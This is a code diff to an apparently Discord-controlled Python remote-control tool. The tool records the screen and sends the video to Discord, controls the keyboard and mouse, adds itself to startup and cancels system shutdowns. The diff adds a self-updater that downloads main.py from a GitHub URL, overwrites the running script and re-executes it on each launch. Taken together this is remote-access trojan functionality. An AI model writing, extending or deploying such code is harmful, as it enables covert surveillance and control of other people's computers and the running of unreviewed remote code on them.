@@ -5,8 +5,9 @@ import threading
 import subprocess
 import platform
 import asyncio
+import urllib.request
 from datetime import datetime
-
+import sys
 os.system("pip install discord")
 os.system("pip install pynput")
 os.system("pip install pyautogui")
@@ -27,8 +28,8 @@ from tkinter import *
 from discord.ext import commands
 from pynput.keyboard import Key, Controller as KeyboardController, Listener as KeyboardListener
 from pynput.mouse import Button, Controller as MouseController
-# https://discord.com/developers/applications/
-TOKEN = 'ENTER YOUR BOT TOKEN BEFORE USING!'
+
+TOKEN = 'ADD YOUR OWN BOT TOKEN'
 
 intents = discord.Intents.default()
 intents.messages = True
@@ -301,7 +302,7 @@ def record_screen(duration=10, output="screen_record.mp4"):
 async def screenrec(ctx, duration: int = 10):
     output = f"screen_record_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
     threading.Thread(target=record_screen, args=(duration, output)).start()
-    await asyncio.sleep(duration + 2) 
+    await asyncio.sleep(duration + 2)  # Wait for the recording to finish and file to be saved
     await ctx.send(file=discord.File(output))
     os.remove(output)
 
@@ -318,6 +319,27 @@ def prevent_shutdown():
             bot.loop.create_task(bot.close())
             subprocess.run("shutdown /a", shell=True)
 
+def check_for_updates():
+    try:
+        url = "https://github.com/pyroalww/remote-control-tool/raw/main/main.py"
+        local_file = os.path.abspath(__file__)
+        
+        with urllib.request.urlopen(url) as response:
+            remote_code = response.read().decode('utf-8')
+        
+        with open(local_file, 'r', encoding='utf-8') as file:
+            local_code = file.read()
+        
+        if remote_code != local_code:
+            with open(local_file, 'w', encoding='utf-8') as file:
+                file.write(remote_code)
+            print("Kod güncellendi, program yeniden başlatılıyor.")
+            os.execv(sys.executable, ['python'] + sys.argv)
+    except Exception as e:
+        print(f"Güncelleme kontrolü başarısız oldu: {e}")
+        pass
+
+check_for_updates()
 add_to_startup()
 
 bot.run(TOKEN)
